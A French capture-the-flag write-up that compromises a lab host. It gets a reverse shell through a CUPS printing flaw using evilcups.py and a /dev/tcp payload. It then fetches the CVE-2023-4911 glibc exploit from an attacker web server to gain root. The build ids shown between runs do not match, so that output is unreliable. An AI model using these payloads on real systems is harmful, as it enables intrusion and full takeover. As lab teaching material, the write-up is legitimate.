# WRITEUP_ORAL


# Exploitation CUPS & CVE-2023-4911

## Scan de la machine

```bash
sudo nmap 172.24.70.169
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-08 08:43 CEST
Nmap scan report for 172.24.70.169
Host is up (0.015s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
631/tcp open  ipp
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

## Accès à l'interface web CUPS

Présence d'un serveur d'impression, mais je ne suis pas autorisé à accéder à l'interface web :

```bash
curl -I http://172.24.70.169:631
```

```
HTTP/1.1 403 Forbidden
Connection: close
Content-Language: fr_FR
Content-Length: 368
Content-Type: text/html; charset=utf-8
Date: Tue, 08 Oct 2024 06:44:36 GMT
Accept-Encoding: gzip, deflate, identity
Server: CUPS/2.4 IPP/2.1
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

## Est-ce que cette version de CUPS est vulnérable ?

### Sources :

- https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/
- https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8#:~:text=from%20the%20PPD.-,PoC,-Uses%20the%20ippserver
- https://github.com/RickdeJager/cupshax/
- https://github.com/IppSec/evil-cups/blob/main/evilcups.py

Différents POCs sont disponibles sur internet.

---

## Sur la machine attaquante

Je mets un port en écoute :

```bash
nc -lvp 9001
```

Puis je lance l'attaque (ici, l'adresse 172.24.8.203 est l'adresse IP de la machine attaquante, 172.24.70.169 est celle de la machine attaquée) :

```bash
pip install -r requirements.txt
python3 evilcups.py 172.24.8.203 172.24.70.169 'bash -c "bash -i >& /dev/tcp/172.24.8.203/9001 0>&1"'
```

J'attends que la machine distante détecte l'imprimante, et que la victime démarre une impression.  
Au bout de quelques minutes, j'obtiens un shell avec les droits de l'utilisateur `lp` :

```
172.24.70.169: inverse host lookup failed: Unknown host
connect to [172.24.8.203] from (UNKNOWN) [172.24.70.169] 37206
bash: impossible de régler le groupe de processus du terminal (979): Ioctl() inapproprié pour un périphérique
bash: pas de contrôle de tâche dans ce shell
lp@debian:/$
```

---

## Récupération du premier flag

```bash
lp@debian:/$ ls -l /
```

```
...
-rw-r--r--   1 root root    43  7 oct.  13:40 flag-part1.txt
-rw-r-----   1 root root    36  7 oct.  13:43 flag-part2.txt
...
```

```bash
lp@debian:/$ cat /flag-part1.txt
```

```
part 1 : fl@g{?DidYouMake4g00dlmpression?}
```

---

## Partie 2 : Escalade de privilèges

Il faut des privilèges élevés (root) pour lire le fichier contenant le deuxième flag : `/flag-part2.txt`.  
Il faut que je trouve un moyen de passer root.

### Vérification de la version de `libc`

```bash
lp@debian:/$ dpkg -l | grep libc6
```

```
ii  libc6:amd64  2.36-9  amd64  GNU C Library: Shared libraries
```

La version de `libc` est vulnérable à la **CVE-2023-4911**.

---

## Exploitation de la vulnérabilité

On télécharge le POC permettant d'exploiter la vulnérabilité, sur ma machine attaquante.  
Je l'expose via un petit serveur web python :

```bash
wget -U "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" https://haxx.in/files/gnu-acme.py
python3 -m http.server 9000
```

### Depuis la machine victime :

```bash
temp="$(mktemp -d)"
cd $temp
wget http://172.24.8.203:9000/gnu-acme.py
```

Et on exécute :

```bash
python3 gnu-acme.py
```

```
$$$ glibc ld.so (CVE-2023-4911) exploit $$$
    -- by blasty <peter@haxx.in> --
[i] libc = /lib/x86_64-linux-gnu/libc.so.6
[i] suid target = /usr/bin/su, suid_args = ['--help']
[i] ld.so = /lib64/ld-linux-x86-64.so.2
[i] ld.so build id = 4286bd11475e673b194ee969f5f9e9759695e644
[i] __libc_start_main = 0x271c0
[i] using hax path b'\x08' at offset -8
[i] wrote patched libc.so.6
error: no target info found for build id 4286bd11475e673b194ee969f5f9e9759695e644
```

### Correction du script

On modifie légèrement le code python en ajoutant ce `build id` dans le dictionnaire `TARGETS` :

```python
TARGETS = {
    "4286bd11475e673b194ee969f5f9e9759695e644": 561,
    ...
}
```

Et on relance :

```bash
python3 gnu-acme.py
```

```
$$$ glibc ld.so (CVE-2023-4911) exploit $$$
    -- by blasty <peter@haxx.in> --
[i] libc = /lib/x86_64-linux-gnu/libc.so.6
[i] suid target = /bin/su, suid_args = ['--help']
[i] ld.so = /lib64/ld-linux-x86-64.so.2
[i] ld.so build id = aa1b0b998999c397062e1016f0c95dc0e8820117
[i] __libc_start_main = 0x29dc0
[i] using hax path b'"' at offset -20
[i] wrote patched libc.so.6
[i] using stack addr 0x7ffe10101008
............................................
```

---

## Passage root

Au bout d'un moment, plus rien ne se passe. On tape une commande :

```bash
id
```

```
uid=0(root) gid=7(lp) groups=7(lp)
```

On est bien root. On affiche le flag :

```bash
cat /flag-part2.txt
```

```
part 2 : fl@g{///100neyTun4bleS///}
```
